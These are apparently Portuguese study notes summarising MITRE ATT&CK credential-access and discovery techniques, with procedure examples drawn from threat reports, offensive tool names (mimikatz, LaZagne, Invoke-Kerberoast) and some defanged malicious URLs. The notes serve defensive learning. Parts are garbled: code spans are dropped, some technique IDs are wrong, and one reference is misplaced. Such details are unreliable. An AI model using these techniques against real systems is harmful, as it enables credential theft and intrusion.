**Exemplo de procedimento:** O APT29 contornou o conjunto MFA em contas OWA, gerando um valor de cookie a partir de uma chave secreta anteriormente roubada.

**REFERÊNCIA:** https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/

.002 **SAML Tokens:** A vida útil padrão de um token SAML é de uma hora, mas o período de validade pode ser especificado no valor do elemento em um token. Esse valor pode ser alterado usando o em um . Os tokens SAML forjados permitem que os adversários se autentiquem em serviços que usam o SAML 2.0 como um mecanismo SSO (único sinal de login).

**Exemplo de procedimento:** O APT29 criou tokens usando certificados de assinatura SAML comprometidos: Os atacantes injetaram um código backdoor na biblioteca do solarwinds, esse backdoor era distribuido em atualizações de redes, ao executar o backdoor é carregado antes do código legítimo ser executado, os invadores comprometem a biblioteca assinadas que usavam os próprios certificados tentando burlar as tecnologias de controle.

T1056 **Captura de entrada:** Durante o uso normal do sistema, os usuários geralmente fornecem credenciais para vários locais diferentes, como páginas de login/portais ou caixas de diálogo do sistema.

.001 **Keylogging:** . É provável que o keylogging seja usado para adquirir credenciais para novas oportunidades de acesso quando os esforços de dumping de credenciais do OS não forem eficazes, e podem exigir que um adversário intercepte teclas em um sistema por um período substancial de tempo antes que as credenciais possam ser capturadas com sucesso. O keylogging é o tipo mais prevalente de captura de entrada, com muitas maneiras diferentes de interceptar teclas

**Exemplo de procedimento:** Agente Tesla pode registrar toques de teclas na máquina da vítima:  Agente Tesla, o arquivo baixado foi um arquivo RTF com o HASH SHA256

**REFERÊNCIA:** https://blog.talosintelligence.com/2018/10/old-dog-new-tricks-analysing-new-rtf_15.html


**REFERÊNCIA:** https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/

.002 **Captura de entrada GUI:** Os adversários podem imitar componentes de GUI comuns do sistema operacional para solicitar aos usuários credenciais com um prompt aparentemente legítimo. Quando programas são executados que precisam de privilégios adicionais do que estão presentes no contexto atual do usuário, é comum que o sistema operacional solicite ao usuário credenciais adequadas para autorizar os privilégios elevados para a tarefa (ex: Bypass User Account Control). 

**Exemplo de procedimento:** Dok solicita ao usuário credenciais. O trojan  bancário Windows 'Retefe', este malware instala um servidor proxy malicioso para o Man-in-the-Middle (MitM) todo o tráfego da Web, a fim de farejar as credenciais bancárias das vítimas e manipular o tráfego para obter acesso a contas financeiras. Anexado aos e-mails maliciosos, está um arquivo zip (Dokument.zip), que contém o malware. Os usuários que ingenuamente acreditam nas instruções no e-mail e unzip Dokument.zip, encontrarão um único arquivo chamado Dokument:

**REFERÊNCIA:** https://objective-see.com/blog/blog_0x25.html#Dok

.003 **Captura de portal da Web:** Os adversários podem instalar código em portais voltados externamente, como uma página de login VPN, para capturar e transmitir credenciais de usuários que tentam entrar no serviço. Por exemplo, uma página de login comprometida pode registrar credenciais do usuário antes de registrar o usuário no serviço.

**REFERÊNCIA:** https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/

.004 **Gancho de API credencial:** Mecanismos de gancho maliciosos podem capturar chamadas de API que incluem parâmetros que revelam credenciais de autenticação do usuário. Ao contrário do Keylogging, essa técnica se concentra especificamente em funções de API que incluem parâmetros que revelam credenciais do usuário. A conexão envolve redirecionar chamadas para essas funções e pode ser implementado.

**Exemplo de procedimento:** TrickBot tem a capacidade de capturar credenciais RDP capturando a APICredEnumerateA. O malware chega por um e-mail disfarçado como uma notificação de incentivo fiscal de uma grande empresa de serviços financeiros. Este e-mail inclui um anexo de planilha microsoft excel habilitado para macro (XLSM) (detectado como Trojan.W97M.MERETAM.A) que supostamente contém os detalhes do incentivo fiscal. No entanto, como esses anexos geralmente vão, essa macro é maliciosa e irá baixar e implantar Trickbot na máquina do usuário uma vez ativado.

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/19/b/trickbot-adds-remote-application-credential-grabbing-capabilities-to-its-repertoire.html

T1556 **Modificar processo de autenticação:** O processo de autenticação é tratado por mecanismos, como o processo LSASS (Local Security Authentication Server, servidor de autenticação de segurança) e o Gerenciador de Contas de Segurança (SAM) no Windows, módulos de autenticação plugáveis (PAM) em sistemas baseados no Unix e plugins de autorização em sistemas MacOS, responsáveis por coletar, armazenar e validar credenciais. 

.001 **Autenticação do controlador de domínio:**  o controlador é uma solução que ajuda a gerenciar os acessos a um servidor. Entre outras funções, o papel central desse recurso é responder aos pedidos de autenticação de segurança quando, por exemplo, um usuário loga em uma máquina da empresa. 

**Exemplo de procedimento:** O malware pode ser usado para injetar credenciais falsas no processo de autenticação em um controlador de domínio com a intenção de criar um backdoor usado para acessar a conta e/ou credenciais de qualquer usuário. 

**REFERÊNCIA:** https://www.secureworks.com/research/skeleton-key-malware-analysis

.002 **DLL do filtro de senha:** Os filtros de senha do Windows são mecanismos de aplicação de políticas de senha para contas de domínio e locais. Os filtros são implementados como DLLs contendo um método para validar senhas potenciais contra políticas de senha

**Exemplo de procedimento:**  A Remsec coleta credenciais de texto simples como um filtro de senha registrado em controladores de domínio: Um estranho executável biblioteca de programa carregada na memória do servidor do controlador de domínio. A biblioteca foi registrada como Filtro de senha do Windows e teve acesso a dados confidenciais, como senhas administrativas em texto não criptografado.

**REFERÊNCIA:** https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07190154/The-ProjectSauron-APT_research_KL.pdf

.003 **Módulos de autenticação plugáveis:**  PAM é um sistema modular de arquivos de configuração, bibliotecas e arquivos executáveis que orientam a autenticação para muitos serviços. O módulo de autenticação mais comum é , que recupera, define e verifica as informações de autenticação da conta em e .pam_unix.so/etc/passwd/etc/shadow

**Exemplo de procedimento:** A Ebury pode desativar os módulos PAM para adulterar a configuração do sshd. Ebury v1.4 tem um mecanismo de recuo pelo qual um algoritmo de geração de domínio (DGA) é usado quando o invasor não se conecta ao sistema infectado através do backdoor OpenSSH por três dias. Nessas condições, Ebury exfiltrará os dados coletados usando o domínio gerado. Ebury v1.6 tem o mesmo mecanismo, mas há uma pequena mudança na própria DGA. Apenas as constantes mudaram entre essas duas versão..

![image](https://user-images.githubusercontent.com/95362045/158392661-e017a38a-9662-4e0c-ae89-7d5654f0ae82.png)
![image](https://user-images.githubusercontent.com/95362045/158392808-be5260d3-2998-4b6e-a84b-d92ba34f43c3.png)

**REFERÊNCIA:** https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/

.004 **Autenticação do dispositivo de rede:** Os adversários podem usar a Patch System Image para codificar duramente uma senha no sistema operacional, ignorando assim os mecanismos de autenticação nativo para contas locais em dispositivos de rede.

**Exemplo de procedimento:** O SYNful Knock tem a capacidade de adicionar sua própria senha backdoor personalizada quando modifica o sistema operacional do dispositivo de rede afetado : O implante consiste em uma imagem cisco IOS modificada que permite ao invasor carregar diferentes módulos funcionais a partir do anonimato da internet. O implante também fornece acesso irrestrito usando uma senha secreta do backdoor. Cada um dos módulos é habilitado através do protocolo HTTP (não HTTPS), usando um pacote TCP especificamente elaborado enviado para a interface dos roteadores. Os pacotes têm uma sequência não padronizada e números de reconhecimento correspondentes. Os módulos podem se manifestar como código executável independente ou ganchos dentro dos roteadores IOS que fornecem funcionalidade semelhante à senha do backdoor. A senha do backdoor fornece acesso ao roteador através do console e da Telnet.

**REFERÊNCIA:** https://www.mandiant.com/resources/synful-knock-acis

T040 **Sniffing de rede:** O sniffing de rede refere-se ao uso da interface de rede em um sistema para monitorar ou capturar informações enviadas por uma conexão com fio ou sem fio. Um adversário pode colocar uma interface de rede no modo promíscuo para acessar passivamente dados em trânsito pela rede ou usar portas de extensão para capturar uma quantidade maior de dados.

**Exemplo de procedimento:** DarkVishnya usou a rede farejando para obter dados de login. invasores se conectaram remotamente ao dispositivo e digitalizaram a rede local buscando obter acesso a pastas públicas compartilhadas, servidores web e quaisquer outros recursos abertos. O objetivo foi colher informações sobre a rede, sobretudo, servidores e estações de trabalho utilizadas para a realização de pagamentos. Ao mesmo tempo, os atacantes tentaram fazer força bruta ou farejar dados de login para tais máquinas. Para superar as restrições de firewall, eles plantaram códigos de shell com servidores TCP locais. Se o firewall bloqueou o acesso de um segmento da rede para outro, mas permitiu uma conexão reversa, os atacantes usaram uma carga diferente para construir túneis.

**REFERÊNCIA:** https://securelist.com/darkvishnya/89169/

T1003 **Dumping de credenciais do OS:** Os adversários podem tentar despejar credenciais para obter o login da conta e material de credencial, normalmente na forma de um hash ou uma senha de texto clara, do sistema operacional e software. As credenciais podem então ser usadas para executar o Movimento Lateral e acessar informações restritas.

**Exemplo de procedimento:** Carbanak obtém detalhes de senha do logotipo do Windows: ARBANAK é um backdoor completo com recursos de roubo de dados e uma arquitetura plugin. Alguns de seus recursos incluem registro-chave, captura de vídeo de desktop, captura de formulários VNC, captura de formulário HTTP, gerenciamento de sistema de arquivos, transferência de arquivos, túnel TCP, proxy HTTP, destruição do SISTEMA, roubo de dados POS e Outlook e shell reverso.

**REFERÊNCIA:** https://www.mandiant.com/resources/behind-the-carbanak-backdoor

.001 **Memória LSASS:** O LSASS é o Subsistema da Autoridade de Segurança Local. Em última análise, é responsável por tornar o acesso concedido / acesso negado quando você tenta acessar recursos em um sistema operacional derivado do Windows NT.  Após um logs de usuário, o sistema gera e armazena uma variedade de materiais de credenciais na memória do processo LSASS. Esses materiais de credenciais podem ser colhidos por um usuário administrativo ou SISTEMA e usados para realizar movimento lateral utilizando material de autenticação alternativa de uso.

**Exemplo de procedimento:** Kimsuky usa vários métodos de spearphishing e engenharia social para obter acesso inicial às redes de vítimas. Spearphishing — com um anexo malicioso incorporado no e-mail. O grupo APT usou credenciais de hospedagem na Web — roubadas de vítimas fora de seus alvos habituais — para hospedar seus scripts e ferramentas maliciosas. epois de obter acesso inicial, Kimsuky usa malware BabyShark e PowerShell ou o Windows Command Shell for Execution 

**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa20-301a

.002 **Gerente de Contas de Segurança:** Os adversários podem tentar extrair material credencial do banco de dados SAM (Security Account Manager, gerente de contas de segurança) através de técnicas de memória ou através do Registro do Windows, onde o banco de dados SAM é armazenado. O SAM é um arquivo de banco de dados que contém contas locais para o host, normalmente aquelas encontradas com o comando. Enumerar o banco de dados SAM requer acesso ao nível do SISTEMA. 

.003 **NTDS:** Os adversários podem tentar acessar ou criar uma cópia do banco de dados de domínio do Active Directory, a fim de roubar informações de credenciais, bem como obter outras informações sobre membros do domínio, como dispositivos, usuários e direitos de acesso. Por padrão, o arquivo NTDS (NTDS.dit) está localizado em um controlador de domínio. 

.004 **Segredos da LSA:** Os adversários com acesso ao SISTEMA a um host podem tentar acessar segredos da Autoridade Local de Segurança (LSA), que podem conter uma variedade de diferentes materiais de credenciais, como credenciais para contas de serviço. Os segredos da LSA são armazenados no registro em . Segredos da LSA também podem ser despejados da memória.

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/

.005 **Credenciais de domínio em cache:**   No Windows Vista e mais recente, o formato hash é o hash DCC2 (Domain Cached Credentials versão 2), também conhecido como hash MS-Cache v2.O número de credenciais padrão em cache varia e pode ser alterado por sistema. Este hash não permite ataques no estilo pass-the-hash e, em vez disso, requer que o Password Cracking recupere a senha do texto simples. 

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/

.006 **DCSync:** Os adversários podem tentar acessar credenciais e outras informações confidenciais abusando da interface de programação de aplicativos (API) do Windows Domain Controller.

**Exemplo de procedimento:** Este ataque apresenta uma técnica sofisticada envolvendo um compromisso da cadeia de fornecimento de software que permitiu aos invasores introduzir códigos maliciosos em binários assinados na Plataforma SolarWinds Orion, um software popular de gerenciamento de TI. 

Usando o SolarWinds DLL comprometido para ativar um backdoor que permite que os atacantes controlem e operem remotamente em um dispositivo
Usando o acesso backdoor para roubar credenciais, aumente privilégios e mova-se lateralmente para obter a capacidade de criar tokens SAML válidos usando qualquer um dos dois métodos:
Roubando o certificado de assinatura SAML (Caminho 1)
Adicionando ou modificando a confiança da federação existente (Caminho 2)
Usando tokens SAML criados por invasor para acessar recursos na nuvem e executar ações que levem à exfiltração de e-mails e persistência na nuvem

**REFERÊNCIA:** https://www.microsoft.com/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/

.007 **Sistema de arquivos Proc:** O sistema de arquivos Proc no Linux contém uma grande quantidade de informações sobre o estado do sistema operacional em execução. Processos em execução com privilégios radiculares podem usar essa facilidade para raspar a memória ao vivo de outros programas em execução.

**Exemplo de procedimento:** Uma ferramenta para despejar a senha de login do atual usuário de desktop linux. Adaptado da ideia por trás da popular ferramenta Windows mimikatz.
![image](https://user-images.githubusercontent.com/95362045/158437847-b19ef127-102b-4e58-9b15-89cfb89adf7e.png)

Aproveita as credenciais de texto claro na memória, despejando o processo e extraindo linhas que têm uma alta probabilidade de conter senhas de texto claro. Tentará calcular a probabilidade de cada palavra verificando hashes em /etc/shadow, hashes na memória e pesquisas de regex. 2.0 introduz uma porta C limpa que visa aumentar a velocidade de execução e portabilidade

.008 **/etc/passwd e /etc/shadow:** Os sistemas operacionais Linux mais modernos usam uma combinação de e para armazenar informações da conta de usuário, incluindo hashes de senha em . Por padrão, só é legível pelo usuário raiz./etc/passwd/etc/shadow/etc/passwd/etc/shadow/etc/shadow/etc/shadow. O utilitário Linux, sem sombra, pode ser usado para combinar os dois arquivos em um formato adequado para utilitários de quebra de senha, como John, o Estripador:

**Exemplo de procedimento:** O projeto LaZagne é um aplicativo de código aberto usado para recuperar muitas senhas armazenadas em um computador local. Cada software armazena suas senhas usando diferentes técnicas (texto simples, APIs, algoritmos personalizados, bancos de dados, etc.). Esta ferramenta foi desenvolvida com o propósito de encontrar essas senhas para o software mais usado.
![image](https://user-images.githubusercontent.com/95362045/158438098-a7b28608-4465-4318-a64a-229aa6520dc3.png)

**REFERÊNCIA:** https://github.com/AlessandroZ/LaZagne

T1528 **Roubar token de acesso de aplicativos:** Os adversários podem roubar tokens de acesso de aplicativos de usuários como forma de adquirir credenciais para acessar sistemas e recursos remotos. Isso pode ocorrer através da engenharia social e normalmente requer ação do usuário para conceder acesso., Os tokens de acesso ao aplicativo são usados para fazer solicitações de API autorizadas em nome de um usuário e são comumente usados como uma maneira de acessar recursos em aplicativos baseados em nuvem e software-as-a-service (SaaS).

**Exemplo de procedimento:** O APT28 usou vários aplicativos maliciosos para roubar tokens de acesso do usuário OAuth, incluindo aplicativos disfarçados de "Google Defender" "Google Email Protection" e "Google Scanner" para usuários do Gmail. Eles também tinham como alvo usuários do Yahoo com aplicativos disfarçados de "Serviço de Entrega" e "Proteção de E-mail da McAfee"

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/17/d/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks.html

T1558 **Roubar ou Forjar Ingressos Kerberos:** Os adversários podem tentar subverter a autenticação de Kerberos roubando ou falsificando bilhetes de Kerberos para habilitar o Pass the Ticket. Kerberos é um protocolo de autenticação amplamente utilizado em ambientes modernos de domínio do Windows. Nos ambientes Kerberos, chamados de "reinos", há três participantes básicos: cliente, serviço e Key Distribution Center (KDC).

.001 **Bilhete Dourado:** Usando um bilhete dourado, os adversários podem então solicitar bilhetes do Serviço de Concessão de Ingressos (TGS), que permitem o acesso a recursos específicos. Os bilhetes dourados exigem que os adversários interajam com o Key Distribution Center (KDC) para obter tgs.

**REFERêNCIA:** https://research.nccgroup.com/2018/03/10/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/

.002 **Bilhete prata:** Os bilhetes prateados são mais limitados em escopo do que os bilhetes dourados, pois só permitem que os adversários acessem um recurso específico (por exemplo, MSSQL) e o sistema que hospeda o recurso; no entanto, ao contrário dos bilhetes dourados, os adversários com a capacidade de forjar bilhetes prateados são capazes de criar bilhetes TGS sem interagir com o Key Distribution Center (KDC), potencialmente dificultando a detecção:

**REFERÊNCIA:** https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos

.003 **Kerberoasting:** Os adversários podem abusar de um bilhete de concessão de bilhetes Kerberos válido (TGT) ou farejar o tráfego da rede para obter um bilhete de serviço de concessão de bilhetes (TGS) que pode ser vulnerável à Força Bruta.

**Exemplo de procedimento:** A Empire usa o PowerSploit's para solicitar bilhetes de serviço e devolver hashes de bilhetes rachados.Invoke-Kerberoast

**REFERÊNCIA:** https://github.com/EmpireProject/Empire

.004 **AS-REP Roasting:** Os adversários podem revelar credenciais de contas que desativaram a pré-autenticação de Kerberos por mensagens Password Cracking Kerberos. A pré-coordenação oferece proteção contra quebra de senha offline. Quando ativado, um usuário que solicita acesso a um recurso inicia a comunicação com o Controlador de Domínio (DC) enviando uma mensagem AS-REQ (Authentication Server Request) com um cronograma criptografado com o hash de sua senha.

T1539 **Roubar cookies de sessão web:** Os cookies são geralmente válidos por um longo período de tempo, mesmo que o aplicativo web não seja usado ativamente. Os cookies podem ser encontrados em disco, na memória de processo do navegador e no tráfego de rede para sistemas remotos.

**Exemplo de procedimento:** Volexity identificou código suspeito sendo carregado via www.dailynk[.] com para subdomínios maliciosos de jquery[.] serviços. Exemplos de URLs observados carregando código malicioso

hxxps://www.dailynk[.] com/wp-includes/js/jquery/jquery.min.js?ver=3.5.1

hxxps://www.dailynk[.] com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2

Esses URLs levam a arquivos legítimos usados como parte da função normal do site do Daily NK; no entanto, seu conteúdo foi modificado pelo invasor para incluir usuários de redirecionamento de código para carregar JavaScript malicioso do domínio de propriedade do invasor jquery[.] Serviços. O código incluído pelo invasor só foi adicionado por curtos períodos de tempo e foi rapidamente removido, dificultando a identificação desta atividade, pois o conteúdo malicioso nem sempre estava disponível.

T1111 **Interceptação de autenticação de dois fatores:** O uso de autenticação de dois ou vários fatores (2FA ou MFA) é recomendado e fornece um nível de segurança mais alto do que apenas nomes de usuário e senhas, mas as organizações devem estar cientes de técnicas que poderiam ser usadas para interceptar e contornar esses mecanismos de segurança.

**Exemplo de procedimento:** Quimera registrou números de telefone alternativos para usuários comprometidos interceptarem códigos 2FA enviados via SMS. Esse método começa com dados adquiridos em outras violações, as credenciais são usadas com spray de senha contra serviçps remotos das vítimas, tendo exito eles usam contas para acessar VPN das vítimas, ssim que eles têm uma base em um sistema (também conhecido como paciente zero ou caso de índice), eles verificam as permissões da conta nesse sistema e tentam obter uma lista de contas com privilégios de administrador.

**REFERÊNCIA:** https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/

T1552 **Credenciais não inseguras** Os adversários podem pesquisar sistemas comprometidos para encontrar e obter credenciais armazenadas de forma insegura. Essas credenciais podem ser armazenadas e/ou extraviadas em muitos locais em um sistema, incluindo arquivos de texto simples.

.001 **Credenciais em arquivos:**  Estes podem ser arquivos criados pelos usuários para armazenar suas próprias credenciais, lojas de credenciais compartilhadas para um grupo de indivíduos, arquivos de configuração contendo senhas para um sistema ou serviço, ou código-fonte/arquivos binários contendo senhas incorporadas.

**Exemplo de procedimento:** O Agente Tesla tem a capacidade de extrair credenciais de arquivos de configuração ou suporte : Como muitas outras ameaças, o principal mecanismo de entrega do Agente Tesla é o e-mail (mensagens de phishing).  por trás das campanhas do Agente Tesla também usaram documentos maliciosos do Office para facilitar a entrega em primeiro estágio. Documentos especialmente elaborados, explorando vulnerabilidades do Office. O Agente Tesla agora é capaz de coletar dados de configuração e credenciais de vários clientes comuns de VPN, clientes FTP e E-mail e Navegadores da Web. O malware tem a capacidade de extrair credenciais do registro, bem como arquivos de configuração ou suporte relacionados

**REFERÊNCIA:** https://www.sentinelone.com/labs/agent-tesla-old-rat-uses-new-tricks-to-stay-on-top/

.002 **Credenciais no Registro:** O Registro do Windows armazena informações de configuração que podem ser usadas pelo sistema ou outros programas. Os adversários podem consultar o Registro em busca de credenciais e senhas armazenadas para uso por outros programas ou serviços. Às vezes, essas credenciais são usadas para logons automáticos.

**REFERÊNCIA:** https://www.sentinelone.com/labs/agent-tesla-old-rat-uses-new-tricks-to-stay-on-top/

.003 **História do Bash:** O Bash mantém o controle dos comandos digitam os usuários na linha de comando com o utilitário "history". Uma vez que um usuário faz logoff, o histórico é liberado para o arquivo do usuário. Para cada usuário, este arquivo reside no mesmo local: . Normalmente, este arquivo acompanha os últimos 500 comandos do usuário

**Exemplo de procedimento:** Kinsing procurou credenciais.bash_history: O ataque é iniciado aproveitando a porta API aberta desprotegida, os atacantes são capazes de instanciar um contêiner Ubuntu com o seguinte ponto de entrada.

![image](https://user-images.githubusercontent.com/95362045/158654124-92e088b2-e36c-439d-b7c7-29be20087327.png)

Esse comando atualiza pacotes, instala wget, inicia serviço de cron e executa o script shell. 

Esse script ele desativa as medidas de segurança e limpa os registros, exclui alguns arquivos selecionado a malwares, baixa o malware kinsing e o executa e Procura por outros comandos em execução em cron, e se os foram identificados, exclui todos os trabalhos de cron, incluindo o seu próprio. O mwalware kinsing é feito em golang.

**REFERÊNCIA:** https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability

.004 **Chaves privadas:** Chaves e certificados criptográficos privados são usados para autenticação, criptografia/descriptografia e assinaturas digitais. As extensões comuns de arquivos de chave e certificado incluem: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.

**Exemplo de procedimento:** Kinsing procurou por chaves particulares: os atacantes exploram uma porta de API Docker desconfigurada para executar um contêiner Ubuntu com o malware malicioso, que por sua vez executa um criptominador e, em seguida, tenta espalhar o malware para outros contêineres e hosts. 

**REFERÊNCIA:** https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability

.005 **API de metadados de instância de nuvem:** A maioria dos provedores de serviços em nuvem suporta uma API de Metadados de Instância de Nuvem, que é um serviço fornecido para executar instâncias virtuais que permite aos aplicativos acessar informações sobre a instância virtual em execução.

**Exemplo de procedimento:** Hildegard consultou a API de Metadados de Instância de Nuvem para credenciais em nuvem: Os atacantes ganharam acesso inicial através de um kubelet mal configurado que permitiu acesso anônimo. Uma vez que se baseou em um cluster Kubernetes, o malware tentou se espalhar pelo maior número possível de contêineres e, eventualmente, lançou operações de cryptojacking, O atacante baixou o tmate e emitiu um comando para executá-lo e estabelecer um shell reverso para tmate.io do contêiner 1. O atacante, então, continuou o ataque com esta sessão de tmate.

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/

.006 **Preferências de políticas de grupo:** GPP são ferramentas que permitem aos administradores criar políticas de domínio com credenciais incorporadas. Essas políticas permitem que os administradores desemtoam contas locais.Essas políticas de grupo são armazenadas no SYSVOL em um controlador de domínio. Isso significa que qualquer usuário de domínio pode visualizar o compartilhamento SYSVOL e descriptografar a senha (usando a chave AES que foi tornada pública).

**Exemplo de procedimento:** A APT33 tem usado uma variedade de ferramentas disponíveis publicamente, como o Gpppassword, para coletar credenciais. A exploração foi usada contra um alvo no setor químico na Arábia Saudita. Se explorada com sucesso em um computador não reparado, a vulnerabilidade pode permitir que um invasor instale qualquer arquivo no computador, o que efetivamente permite a execução de código no computador alvo. Dois usuários da organização alvo receberam um arquivo chamado "JobDetails.rar", que tentou explorar a vulnerabilidade WinRAR. Este arquivo provavelmente foi entregue através de um e-mail de phishing

**REFERÊNCIA:** Dois usuários da organização alvo receberam um arquivo chamado "JobDetails.rar", que tentou explorar a vulnerabilidade WinRAR. Este arquivo provavelmente foi entregue através de um e-mail de phishing

.007 **API do contêiner:** As APIs nesses ambientes, como as APIs Docker API e Kubernetes, permitem que o usuário gerencie remotamente seus recursos de contêineres e componentes de cluster.

**Exemplo de procedimento:**Um adversário pode acessar a API do Docker para coletar logs que contenham credenciais para nuvem, contêiner e vários outros recursos no ambiente. Um adversário com permissões suficientes, como através da conta de serviço de um pod, também pode usar a API kubernetes para recuperar credenciais do servidor API Kubernetes.

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/

TA0007 **Descobrimento:** 

O adversário está tentando descobrir seu ambiente.

A descoberta consiste em técnicas que um adversário pode usar para obter conhecimento sobre o sistema e a rede interna. Essas técnicas ajudam os adversários a observar o ambiente e orientar-se antes de decidir como agir.

.001 **Descoberta de conta:** Os adversários podem tentar obter uma listagem de contas em um sistema ou dentro de um ambiente. Essas informações podem ajudar os adversários a determinar quais contas existem para ajudar no comportamento de seguimento.

**Exemplo de procedimento:** O APT29 obteve uma lista de usuários e suas funções a partir de um servidor Exchange.

**REFERÊNCIA:** https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/

.002 **Conta de domínio:** Os adversários podem tentar obter uma listagem de contas de domínio. Essas informações podem ajudar os adversários a determinar quais contas de domínio existem para ajudar no comportamento de seguimento.

**Exemplo de procedimento:** O BoomBox tem a capacidade de executar uma consulta LDAP para enumerar o nome distinto, o nome da conta SAM e o nome de exibição para todos os usuários de domínio.

**REFERÊNCIA:** https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/

.003 **Conta de e-mail:** Os adversários podem tentar obter uma listagem de endereços de e-mail e contas. Os adversários podem tentar despejar listas de endereços do Exchange, como listas de endereços globais (GALs) No Google Workspace, o GAL é compartilhado com usuários do Microsoft Outlook através do serviço Google Workspace Sync para Microsoft Outlook (GWSMO). Além disso, o Diretório do Espaço de Trabalho do Google permite que os usuários obtenham uma listagem de outros usuários dentro da organização.

**Exemplo de procedimento:** TrickBot coleta endereços de e-mail do Outlook

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html

.004 **Conta na nuvem:** Contas em nuvem são aquelas criadas e configuradas por uma organização para uso por usuários, suporte remoto, serviços ou para administração de recursos dentro de um provedor de serviços em nuvem ou aplicativo SaaS. Com acesso autenticado existem várias ferramentas que podem ser usadas para encontrar contas. O cmdlet PowerShell pode ser usado para obter nomes de contas dado um grupo de função ou permissões no Office 365.Get-MsolRoleMember O Azure CLI (AZ CLI) também fornece uma interface para obter contas de usuário com acesso autenticado a um domínio. O comando listará todos os usuários dentro de um domínio.az ad user list

**Exemplo de procedimento:** Vazamentos do Diretório Ativo via Azure: 

**REFERÊNCIA:** https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/

T1010 **Descoberta da janela do aplicativo:**  Os adversários podem tentar obter uma listagem de janelas de aplicativos abertas. As listagens de janelas podem transmitir informações sobre como o sistema é usado ou dar contexto às informações coletadas por um keylogger.

**Exemplo de procedimento:** Os grupos usam uma família de malware cada para abrir uma porta dos fundos e roubar informações do computador comprometido. Cadelle usa Backdoor.Cadelspy enquanto Chafer opera com Backdoor.Remexi e Backdoor.Remexi.B.Cadelspy inicialmente chega ao computador como conta-gotas, que baixa dois componentes do instalador que atendem se a vítima está executando um sistema de 32 bits ou 64 bits. Em seguida, o conta-gotas executa o instalador apropriado, que lança a carga maliciosa do Cadelspy e permite que ele seja executado sempre que qualquer programa do Windows for executado.

**REFERÊNCIA:** https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4eccc5e0-b5f3-44fe-bc5c-81eaf95f2118&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments

T1217 **Descoberta do marcador de navegador:** Os marcadores do navegador podem revelar informações pessoais sobre usuários (ex: sites bancários, interesses, mídias sociais, etc.) bem como detalhes sobre recursos internos da rede, como servidores, ferramentas/dashboards ou outras infraestruturas relacionadas.

**Exemplo de procedimento:** Calisto coleta informações sobre marcadores do Google Chrome. É propagado por arquivos de instalação com licença de contrato falso.

**REFERÊNCIA:** https://securelist.com/calisto-trojan-for-macos/86543/

T1580 **Descoberta de infraestrutura em nuvem:** Os atacantes podem tentar descobrir recursos disponíveis dentro de um ambiente de infra como serviço de IaaS, Os provedores de nuvem oferecem métodos como APIse comandos emitidos através de CLIs para servir de informações sobre a infraestrutura.

**Exempo de procedimento:** Um atacante pode enumerar recursos usando as chaves de acesso de usuário comprometido para determinar quais estão disponíveis para esse usuário

**REFERÊNCIA:** https://content.fireeye.com/m-trends/rpt-m-trends-2020

T1538 **Painel de serviços em nuvem:** Um adversário pode usar uma GUI de painel de serviços em nuvem com credenciais roubadas para obter informações úteis de um ambiente operacional em nuvem, como serviços, recursos e recursos específicos. Um exemplo é o centro de comando GCP pode ser usado para visualizar todos os ativos, descobertas de potenciais riscos e segurança para executar consultas adicionais.   

**REFERÊNCIA:** https://cloud.google.com/security-command-center/docs/how-to-use-security-command-center

R1n2k **Descoberta de serviço em nuvem:** Um atacante pode tentar enumerar os serviços de nuvem em execução em um sistema após obter acesso.Métodos como esse podem diferir da plataforma como serviço PaaS, à infra como serviço IaaS ou SaaS

**Exemplo de referência:** Os adversários podem tentar descobrir informações sobre os serviços habilitados em todo o ambiente. Ferramentas e APIs do Azure, como a API Azure AD Graph e a API do Azure Resource Manager, podem enumerar recursos e serviços, incluindo aplicativos, grupos de gerenciamento, recursos e definições de políticas, e suas relações acessíveis por uma identidade

**REFERÊNCIA:** https://docs.microsoft.com/en-us/rest/api/resources/

T1619 **Descoberta de objeto de armazenamento em nuvem:** Os adversários podem enumerar objetos na infraestrutura de armazenamento em nuvem. Os adversários podem usar essas informações durante a descoberta automatizada para moldar comportamentos de seguimento, incluindo a solicitação de todos ou objetos específicos do armazenamento em nuvem. 

**REFERÊNCIA:** https://docs.aws.amazon.com/AmazonS3/latest/API/API_ListObjectsV2.html

T1613 **Descoberta de contêineres e recursos:** Os adversários podem tentar descobrir contêineres e outros recursos que estão disponíveis dentro de um ambiente de contêineres. Outros recursos podem incluir imagens, implantações, pods, nós e outras informações, como o status de um cluster.

